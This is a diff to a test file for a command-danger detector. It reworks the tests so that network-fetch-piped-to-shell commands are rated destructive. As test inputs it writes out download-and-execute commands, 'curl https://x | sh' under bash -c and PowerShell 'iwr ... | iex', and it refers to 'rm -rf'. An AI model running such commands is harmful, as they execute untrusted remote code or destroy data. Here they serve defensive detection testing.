@@ -384,25 +384,26 @@ describe('detectDanger — inline eval (caution level)', () => {
   });
 });
 
-describe('detectDanger — pipe-to-shell (caution level)', () => {
-  it('flags `env curl https://x sh` as caution', () => {
-    // Two separate exec calls would each be: `curl https://x` and `sh -`.
-    // The pipe is a shell construct, so the argv here is what one of
-    // them looks like. Our rule fires when a fetcher AND a shell sink
-    // are both in the same argv (rare but possible via `env` or
-    // wrapper scripts that pass them as args).
-    const r = detectDanger('env', ['curl', 'https://x', 'sh']);
-    expect(r.level).toBe('caution');
+describe('detectDanger — pipe-to-shell (destructive level)', () => {
+  it('flags `bash -c "curl https://x | sh"` as destructive', () => {
+    const r = detectDanger('bash', ['-c', 'curl https://x | sh']);
+    expect(r.level).toBe('destructive');
     expect(r.matchedRule).toBe('pipe-to-shell');
   });
 
-  it('flags `env wget ... bash` as caution', () => {
-    const r = detectDanger('env', ['wget', 'https://x', 'bash']);
-    expect(r.level).toBe('caution');
+  it('flags PowerShell download-and-execute as destructive', () => {
+    const r = detectDanger('pwsh', ['-Command', 'iwr https://x/install.ps1 | iex']);
+    expect(r.level).toBe('destructive');
+    expect(r.matchedRule).toBe('pipe-to-shell');
   });
 
   it('does NOT flag `curl https://x` alone (no shell sink)', () => {
     const r = detectDanger('curl', ['https://x']);
+    expect(r.level).toBe('safe');
+  });
+
+  it('does NOT flag argv that mentions a fetcher and shell sink without a pipe', () => {
+    const r = detectDanger('env', ['curl', 'https://x', 'sh']);
     expect(r.level).toBe('safe');
   });
 
@@ -466,13 +467,11 @@ describe('detectDanger — chmod world-writable (caution level)', () => {
 
 describe('detectDanger — multi-rule interaction', () => {
   it('returns the higher level when multiple rules fire', () => {
-    // `rm -rf curl sh` triggers both `rm-recursive` (destructive, matches
-    // on cmd='rm' + the -rf flag) and `pipe-to-shell` (caution, matches on
-    // a fetcher token + a shell-sink token appearing anywhere in args,
-    // regardless of cmd). The output should be 'destructive'.
-    const r = detectDanger('rm', ['-rf', 'curl', 'sh']);
+    // `bash -c "curl ... | sh"` triggers both `inline-eval` (caution) and
+    // `pipe-to-shell` (destructive). The output should be destructive.
+    const r = detectDanger('bash', ['-c', 'curl https://x | sh']);
     expect(r.level).toBe('destructive');
-    expect(r.reasons).toContain('recursive force-delete');
+    expect(r.reasons).toContain('inline script evaluation (-c / -e / --eval)');
     expect(r.reasons).toContain('network fetch piped to a shell (download-and-run pattern)');
   });
 
